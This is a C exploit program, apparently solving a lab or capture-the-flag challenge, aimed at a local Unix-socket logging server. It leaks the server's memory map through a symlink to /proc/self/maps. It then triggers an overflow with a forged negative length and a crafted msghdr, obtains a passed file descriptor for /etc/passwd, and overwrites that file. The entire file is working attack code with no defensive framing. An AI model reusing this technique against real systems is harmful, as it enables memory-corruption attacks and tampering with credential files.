#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <unistd.h>

#define SOCKET_PATH "/home/task/log_socket"

int check_err(int ret, char *fmt, ...) {
  if (ret != -1)
    return ret;

  va_list argptr;
  va_start(argptr, fmt);
  vprintf(fmt, argptr);
  va_end(argptr);
  exit(-1);
  return -1;
}

void error_printf(char *fmt, ...) {
  va_list argptr;
  va_start(argptr, fmt);
  vprintf(fmt, argptr);
  va_end(argptr);
  exit(-1);
}

pid_t child_pid;

void send_data(char *s, int size, int sockfd) {
  check_err(send(sockfd, &size, 4, 0), "Connection closed");
  check_err(send(sockfd, s, size, 0), "Connection closed");
}

void send_data_special(char *s, int size, int sockfd) {
  int fake_size = -1;
  check_err(send(sockfd, &fake_size, 4, 0), "Connection closed");
  check_err(send(sockfd, s, size, 0), "Connection closed");
}

int create_sock_n_connect() {
  int sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un s_addr = {.sun_family = AF_UNIX};
  strncpy(s_addr.sun_path, SOCKET_PATH, sizeof(s_addr.sun_path) - 1);

  int ret = connect(sockfd, (struct sockaddr *)&s_addr, sizeof(s_addr));
  if (ret < 0)
    error_printf("Unable connect to socket at path %s\n", SOCKET_PATH);
  return sockfd;
}

void add_data(char *dst, char *src, int size, int *cursor) {
  memcpy(&dst[*cursor], src, size);
  *cursor += size;
}

void overflow(char *leaked, int sockfd) {
  int cursor = 0;
  int fd = 5;
  char buf[CMSG_SPACE(sizeof(fd))];
  memset(buf, '\0', sizeof(buf));
  char data[256 + sizeof(struct msghdr)];
  memset(data, 0, sizeof(data));

  char path[] = "/etc/passwd";
  add_data(data, path, sizeof(path) + 1, &cursor);

  char filler[256 - sizeof(path) - 1 - sizeof(buf)];
  memset(filler, 'a', sizeof(filler));
  add_data(data, filler, sizeof(filler), &cursor);

  struct msghdr msg = {0};

  msg.msg_control = buf;
  msg.msg_controllen = sizeof(buf);

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(fd));

  *((int *)CMSG_DATA(cmsg)) = fd;

  msg.msg_controllen = CMSG_SPACE(sizeof(fd));
  printf("MSG CONTROL: %p, size %u\n", &msg, sizeof(msg));
  printf("MSG CONTROL: %p, size %u %u\n", msg.msg_control,
         sizeof(struct cmsghdr), sizeof(buf));
  msg.msg_control = leaked + 0x4F00 - sizeof(buf);

  add_data(data, buf, sizeof(buf), &cursor);
  // memset(&msg, '\x61', sizeof(msg));
  add_data(data, &msg, sizeof(msg), &cursor);

  // if (sendmsg(sockfd, &msg, 0) < 0)
  // err_syserr("Failed to send message\n");
  send_data_special(data, sizeof(data), sockfd);
  fsync(sockfd);
  sleep(2);
  send_data("debian", 7, sockfd);
}

int main(int argc, char **argv) {
  struct msghdr msg = {0};
  struct iovec iovs[1];
  char *buff = malloc(1024 * 1024);
  iovs[0].iov_base = buff;
  iovs[0].iov_len = 1024 * 1024;
  msg.msg_iov = iovs;
  msg.msg_iovlen = 1;

  int sockfd = create_sock_n_connect();

  // umask(0777);
  char *path1 = "/home/ssh_user/tmp";
  mkdir(path1, 0777);
  chmod(path1, 0777);
  symlink("/proc/self/maps", "/home/ssh_user/tmp/lnk");
  char *substr1 = "/home/task/server";
  send_data(path1, strlen(path1), sockfd);
  send_data(substr1, strlen(substr1), sockfd);
  recvmsg(sockfd, &msg, 0);
  puts(buff);
  char *leaked;
  sscanf(buff, "%qx", &leaked);
  printf("LEAKED: %p\n", leaked);
  overflow(leaked, sockfd);
  recvmsg(sockfd, &msg, 0);
  char c_buffer[256];
  msg.msg_control = c_buffer;
  msg.msg_controllen = sizeof(c_buffer);
  recvmsg(sockfd, &msg, 0);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  unsigned char *data = CMSG_DATA(cmsg);
  int fd = *((int *)data);
  printf("Got fd %u\n", fd);
  lseek(fd, SEEK_SET, 0);
  char garbage[] = "INVALID PATH";
  write(fd, garbage, sizeof(garbage));
  close(sockfd);

  return 0;
}
